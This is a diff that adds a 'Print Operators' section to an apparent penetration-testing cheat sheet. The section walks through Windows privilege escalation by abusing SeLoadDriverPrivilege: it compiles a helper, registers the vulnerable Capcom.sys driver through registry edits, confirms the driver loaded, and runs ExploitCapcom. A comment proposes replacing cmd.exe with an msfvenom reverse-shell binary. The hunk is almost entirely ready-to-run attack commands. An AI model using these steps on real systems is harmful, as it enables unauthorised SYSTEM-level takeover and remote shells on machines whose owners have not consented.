@@ -2584,6 +2584,35 @@ C:\> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenancese
 C:\> sc.exe start MozillaMaintenance
 ```
 
+- Print Operators
+
+```
+https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp
+# Edit, and include
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+C:\>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
+C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+https://www.nirsoft.net/utils/driverview.html
+PS C:\> .\DriverView.exe /stext drivers.txt
+PS C:\> cat drivers.txt | Select-String -pattern Capcom
+C:\> EnableSeLoadDriverPrivilege.exe
+PS C:\> .\DriverView.exe /stext drivers.txt
+PS C:\> cat drivers.txt | Select-String -pattern Capcom
+https://github.com/tandasat/ExploitCapcom
+PS C:\> .\ExploitCapcom.exe
+# If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe.
+
+https://github.com/TarlogicSecurity/EoPLoadDriver/
+C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+```
+
 #6. - Persistence
 -----------------------------------------
 
